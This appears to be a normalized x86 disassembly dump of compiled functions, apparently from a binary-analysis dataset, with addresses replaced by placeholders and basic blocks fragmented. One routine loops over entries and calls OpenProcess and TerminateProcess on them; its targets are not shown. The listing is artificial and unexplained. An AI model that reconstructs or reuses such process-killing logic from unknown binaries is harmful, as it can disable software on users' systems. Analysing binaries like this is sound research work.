mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov edi 0x4
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push esi
push eax
call sub_402d50
or eax 0x4
sub_421b10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452dd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
push 0x10
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x10 ] ebx
mov esi ebx
mov esi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x10 ] esi
jmp r-xdata
push ebx
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push rw-data
mov [ esp + 0x58 ] ebx
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edi [ esi ]
cmp edi [ esi + 0x4 ]
je r-xdata
push esi
call sub_40adc0
add esp 0x4
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x30 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea esp [ esp ]
cmp [ esp + 0x38 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0x24 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
test al 0x1
je r-xdata
mov edx [ ecx + 0x14 ]
and edx 0xfffffebf
or edx 0x80
push 0x9
push eax
mov [ ecx + 0x14 ] edx
call sub_40e950
mov eax [ edi + 0x1c ]
add esp 0x8
test eax 0x80000007
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test [ edi + 0x1c ] 0x2
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov edx [ esp + 0x10 ]
add edi 0x20
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
test [ edi + 0x1c ] 0x4
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
push ebx
lea eax [ esp + 0x18 ]
push 0x23
push eax
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
mov eax 0x20
mov [ edx + rw-data ] ax
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
add eax rw-data
mov edx [ eax + 0x14 ]
add esp 0xc
and edx 0xfffffe7f
or edx 0x40
push edi
push rw-data
mov [ eax + 0x14 ] edx
call sub_40a0a0
add esp 0x8
cmp eax ebx
jne r-xdata
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
test [ edi + 0x1c ] 0x80000000
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
test [ edi + 0x1c ] 0x4
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
push r--data
push rw-data
call sub_409de0
add esp 0x8
sub_421dd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x10
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421e10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x13
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421e50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0xe
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421e90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x16
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421ed0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x1d
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421f10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x13
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421f50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp + 0x8 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x18
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_421670
add esp 0x20
mov al 0x1
pop ebp
retn
sub_421f90
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ecx ]
push edi
mov edi eax
xor eax eax
mov [ edi + 0x10 ] eax
push eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
push eax
mov [ edi + 0x14 ] 0x7
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
mov [ edi + 0x1c ] esi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_421fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_453da6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x1b8 ] esi
mov [ ebp - 0x1bc ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x1b0 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x1b8 ] 0x1
mov [ ebp - 0x1b4 ] sub_423340
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x194 ] cx
push 0x13
mov eax r--data
lea ecx [ ebp - 0x194 ]
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
call sub_401c90
lea eax [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x5
mov eax r--data
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] sub_422540
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x174 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x158 ] ax
push 0x29
mov eax r--data
lea ecx [ ebp - 0x158 ]
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
call sub_401c90
lea eax [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x138 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x13c ] sub_422ce0
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x22
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] dx
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0xc4 ] sub_423010
xor eax eax
mov [ ebp - 0xc0 ] ax
push 0x6
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0xa4 ] cx
push 0x14
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x4
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_4229c0
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x2c ] ax
push 0x22
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x84 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_4236f0
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xb
xor edx edx
push 0x31
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xc
call sub_4173f0
xor eax eax
mov [ ebp - 0xfc ] ax
push 0x3
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_423a10
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
xor ecx ecx
mov [ ebp - 0xe0 ] cx
push 0x1a
mov eax r--data
lea ecx [ ebp - 0xe0 ]
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0xe
call sub_4173f0
cmp [ ebp - 0xcc ] 0x8
jb r-xdata
xor eax eax
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] ax
jb r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
jb r-xdata
mov ecx [ ebp - 0xfc ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] cx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] ax
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] cx
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] dx
jb r-xdata
mov ecx [ ebp - 0xc0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] cx
jb r-xdata
mov eax [ ebp - 0x11c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x144 ] 0x8
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x138 ] ax
jb r-xdata
mov edx [ ebp - 0x138 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x160 ] 0x8
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] dx
jb r-xdata
mov ecx [ ebp - 0x158 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x180 ] 0x8
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
mov [ ebp - 0x174 ] cx
jb r-xdata
mov eax [ ebp - 0x174 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x19c ] 0x8
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x194 ] ax
jb r-xdata
mov edx [ ebp - 0x194 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1b0 ]
push ecx
call sub_43811c
add esp 0x4
sub_422540
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452fc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp [ ebx ] eax
je r-xdata
push r--data
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
xor esi esi
add eax 0xffffffe4
push esi
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x30 ]
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] esi
mov [ esp + 0x30 ] cx
call sub_401be0
push r--data
push ecx
mov edx edi
push edx
push ecx
push r--data
push rw-data
mov [ esp + 0x88 ] esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov esi [ ebx ]
mov ecx [ ebx + 0x4 ]
or eax 0xffffffff
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
sub eax 0x2
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edi 0x8
cmp [ esi + 0x14 ] edi
jb r-xdata
dec eax
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push r--data
push esi
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esi ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
lea esi [ esp + 0x20 ]
lea edi [ esp + 0x30 ]
call sub_40b7b0
add esp 0x8
test al al
je r-xdata
mov edi 0x8
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x14 ] edi
jb r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push 0x0
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x80 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push r--data
push esi
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esi ]
push r--data
push ebx
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
mov ebx [ ebx ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x24 ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov [ esp + 0x70 ] 0xffffffff
cmp [ esp + 0x3c ] edi
jb r-xdata
lea edi [ eax + 0x1 ]
mov eax ebx
mov [ esp + 0x10 ] 0x1
call sub_424630
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea esi [ esp + 0x28 ]
mov [ esp + 0x70 ] 0xffffffff
call sub_4218d0
mov [ esp + 0x14 ] 0x1
cmp [ esp + 0x58 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ebx [ esp + 0x24 ]
lea edx [ esp + 0x20 ]
push edx
call sub_423ee0
jmp r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor eax eax
mov [ esp + 0x3c ] 0x7
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] ax
jmp r-xdata
mov edx [ esp + 0x28 ]
push edx
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax ]
cmp [ esp + 0x3c ] 0x8
jb r-xdata
mov edx [ esp + 0x44 ]
push edx
call sub_43811c
push 0x0
push eax
call sub_402d50
or eax 0x4
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov eax [ esp + 0x28 ]
push eax
call sub_43811c
add esp 0x4
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4229c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452f73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx 0x7
xor ebx ebx
xor edx edx
mov [ esp + 0x8c ] ecx
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
mov [ esp + 0xa8 ] ebx
push ebx
mov [ esp + 0x34 ] ecx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x24 ]
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] cx
call sub_401be0
mov edx edi
push edx
lea eax [ esp + 0x58 ]
mov [ esp + 0xac ] 0x1
call sub_40b340
add esp 0x4
test al al
je r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x9
push ecx
mov eax edi
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
mov ecx [ esp + 0x64 ]
add esp 0x8
push ecx
push ebx
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x4c ] 0x8
jb r-xdata
cmp esi 0xffffffff
je r-xdata
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
push ebx
push esi
call [ TerminateProcess@IAT ]
test eax eax
push esi
setne bl
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
mov esi 0x8
cmp [ esp + 0x30 ] esi
jb r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
push r--data
push rw-data
call sub_409de0
add esp 0x8
xor ebx ebx
jmp r-xdata
xor ecx ecx
mov [ esp + 0xa8 ] 0xffffffff
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] cx
cmp [ esp + 0x8c ] esi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
add eax 0x1c
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ esp + 0x78 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
mov eax [ esp + 0x14 ]
sub_422ce0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452f73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx 0x7
xor ebx ebx
xor edx edx
mov [ esp + 0x8c ] ecx
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
mov [ esp + 0xa8 ] ebx
push ebx
mov [ esp + 0x34 ] ecx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x24 ]
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] cx
call sub_401be0
mov edx edi
push edx
lea eax [ esp + 0x58 ]
mov [ esp + 0xac ] 0x1
call sub_40b340
add esp 0x4
test al al
je r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
